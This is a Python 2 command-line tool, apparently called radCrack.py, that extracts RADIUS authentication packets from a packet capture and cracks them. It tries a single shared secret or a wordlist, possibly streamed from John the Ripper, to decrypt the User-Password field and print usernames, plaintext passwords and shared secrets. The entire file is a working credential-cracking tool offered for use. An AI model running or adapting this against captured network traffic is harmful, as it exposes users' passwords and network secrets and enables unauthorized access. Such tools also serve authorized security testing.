#!/usr/bin/env python

import sys
import hashlib
import dpkt
import socket
import getopt

# Preforms one iteration of radius decryption
def rad_decrypt(sec,auth,crypt):
  m = hashlib.md5()
  m.update(sec+auth)
  m = m.digest()
  password = ""
  for i in range(len(crypt)):
    password += chr(ord(m[i])^ord(crypt[i]))
  return password  

# returns true if a string is readable ascii
def is_ascii(s):
  return all((ord(c) < 128 and ord(c) >31) or ord(c)==0 for c in s)


# Returns a list of radius packets, ip address pairs
def get_auth_packets(pcapFile):
  radPackets = []
  p = open(pcapFile, "rb") #TODO try catch
  pcap = dpkt.pcap.Reader(p)
  for ts, buf in pcap:
    eth= dpkt.ethernet.Ethernet(buf)
    ip = eth.data
    udp = ip.data
    if type(udp)==dpkt.udp.UDP and udp.dport==1812:
      radPackets.append((udp.data,ip.dst))
  p.close()
  print "[*] Found "+str(len(radPackets))+" Radius Packets"
  return radPackets

# Grabs important information out of pcap
# gets all necessary info for cracking all auth packets and returns it in a dict
def get_good_stuff_from_pcap(pcapFile):
  goodstuff = {}
  for udpdata, ipdst in get_auth_packets(pcapFile):
    auth = udpdata[4:20]
    cur = 20
    curlen = ord(udpdata[cur+1:cur+2])
    username = "Not Found"
    while ord(udpdata[cur:cur+1])!=2:
      if ord(udpdata[cur:cur+1])==1:
        username = udpdata[cur+2:cur+curlen]
      cur += curlen
      curlen = ord(udpdata[cur+1:cur+2])
    crypt = udpdata[cur+2:cur+curlen]

    # Index each auth with md5 hash to avoid spending time on duplicates 
    m = hashlib.md5()
    m.update(str(ipdst)+str(username)+str(auth)+str(crypt))
    m = m.digest()

    goodstuff[m] = (ipdst, username, auth, crypt)
  return goodstuff


# Primary function that takes a pcap dictionary and list of secrets
# and cracks them
def crack_pcap(secretlist, pcapData, likely):

  for curPacket in pcapData.items():
    crypt = curPacket[1][3]
    ipdst = curPacket[1][0]
    username = curPacket[1][1]
    auth = curPacket[1][2]

    all_passwords = {}
    secretListStripped = [x.strip() for x in secretlist]
    for secret in secretListStripped:
      curpass = auth
      password = ""
      i = 0
      while i < len(crypt):
        password += rad_decrypt(secret,curpass,crypt[i:i+16])
        curpass = crypt[i:i+16]
        i+=16
      if is_ascii(password):
        password = password.rstrip('\0')
        if not likely or (password in secretListStripped):
          all_passwords[secret]=password
          print " "
          print "[*] Possible Radius Password Found"
          print "[*] Radius Server: "+socket.inet_ntoa(ipdst)
          print "[*] Username: "+username          
          print "[*] Password: "+password
          print "[*] Shared Secret: "+secret  

  return (username, all_passwords)

#TODO make better
def usage():
  print ""
  print "[*] USAGE:"
  print "./radCrack.py [options] sharedsecret pcapfile.pcap"
  print "./radCrack.py [options] -w secretlist.txt pcapfile.pcap"
  print "john -incremental -stdout | ./radCrack.py [options] -w - pcapfile.pcap"
  print " "
  print "Options:"
  print "-w || --wordlist  SECRETLIST.txt    Uses newline seperated wordlist for possible shared secrets if the shared secret is unknown"
  print "-l || --likely                      Experimental: only prints cracked password if password is found in secretlist, must be used with -w"
  print ""
  exit(1)

try:
  opts, args = getopt.getopt(sys.argv[1:], "w:lh", ["help","wordlist=","likely"])
except getopt.GetoptError, err:
  print str(err)
  usage()

likely = False
keepGoing = False
secret = "testing123"
secretsfile = ""

for o, a in opts:
  if o in  ("-h", "--help"):
    usage()
  elif o in ("-w", "--wordlist"):
    keepGoing = True
    secretsfile = a
  elif o in ("-l", "--likely"):
    likely = True
  else:
    assert False, "unhandled option"

if len(sys.argv)<3:
  usage()

file = sys.argv[len(sys.argv)-1]
pcapData = get_good_stuff_from_pcap(file)
print "\n[*] Cracking Radius Packets..."  

if keepGoing:
  while keepGoing:
    if secretsfile == "-":
      likely = False
      secrets = [sys.stdin.readline()]
      if not secrets[0]:
        break
    else:
      keepGoing = False
      f = open(secretsfile) #TODO try catch
      secrets = f.readlines()
      f.close()

    crack_pcap(secrets, pcapData, likely)
else:
  likely = False
  secret = sys.argv[len(sys.argv)-2]
  crack_pcap([secret], pcapData, likely)

print "\n[*] DONE "

